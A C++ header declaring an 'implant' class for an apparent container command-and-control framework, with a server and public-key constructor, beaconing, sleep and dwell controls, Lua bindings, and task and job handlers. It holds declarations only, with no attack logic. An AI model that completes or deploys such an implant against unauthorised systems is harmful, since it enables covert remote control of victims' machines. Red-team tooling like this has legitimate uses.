#ifndef CONTAINERC2_IMPLANT_IMPLANT_H_
#define CONTAINERC2_IMPLANT_IMPLANT_H_

#include <vector>
#include <random>
#include <future>
#include <string>

#include <moon.hpp>
#include <lua_object.hpp>

#include "config.h"
#include "state.h"
#include "messages.h"
#include "handlers/hello.h"
#include "handlers/task.h"
#include "handlers/job.h"

struct implant : lua_object {
  implant(const std::string &server,
          const std::string &server_public_key_base64,
          const std::vector<unsigned char> &callback_package);
  ~implant() = default;

  void run();
  void stop();
  bool is_running() const;

 private:

  int luaopen_object(lua_State* L) override;
  int lua_jobs(lua_State* L);
  int lua_exit(lua_State* L);
  int lua_dwell(lua_State* L);
  int lua_server(lua_State* L);
  int lua_callback_package(lua_State* L);
  int lua_sleep(lua_State* L);
  int lua_running(lua_State* L);

  static void on_newstate(lua_State *L, void *userdata);

  state _state;
  messages _messages;
  std::shared_ptr<handler::hello> _handler_hello;
  std::shared_ptr<handler::task> _handler_task;
  std::shared_ptr<handler::job> _handler_job;
};

#endif //CONTAINERC2_IMPLANT_IMPLANT_H_
